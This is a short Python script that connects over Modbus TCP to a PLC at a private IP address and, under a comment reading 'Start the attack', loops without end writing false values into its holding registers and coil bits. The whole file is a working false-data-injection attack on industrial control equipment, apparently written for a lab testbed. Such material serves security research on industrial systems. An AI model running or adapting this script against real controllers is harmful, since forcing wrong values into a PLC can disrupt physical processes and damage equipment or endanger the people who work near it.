
import time
import modbusTcpCom
hostIp = '192.168.8.34'
hostPort = 502
client = modbusTcpCom.modbusTcpClient(hostIp)
print('Try to connect to the target PLC: %s' %str(hostIp))
while not client.checkConn():
    print('Try connect to the PLC')
    print(client.getCoilsBits(0, 8))
    time.sleep(0.5)
# Start the attack
print('Target PLC accept connection request.')
time.sleep(1)
while True:
    print("Inject wrong data...")
    #rst1 = client.setCoilsBit(0,6)
    #time.sleep(3)
    #rst2 = client.setCoilsBit(0,5)
    #time.sleep(3)
    for i in range(8):
        client.setHoldingRegs(i, 1)
        time.sleep(0.1)
    for i in range(8):
        client.setCoilsBit(i, 12)
        time.sleep(0.1)
    
    time.sleep(1)
    print(client.getCoilsBits(0, 8))
    #if rst1 is None: print("injection failed")
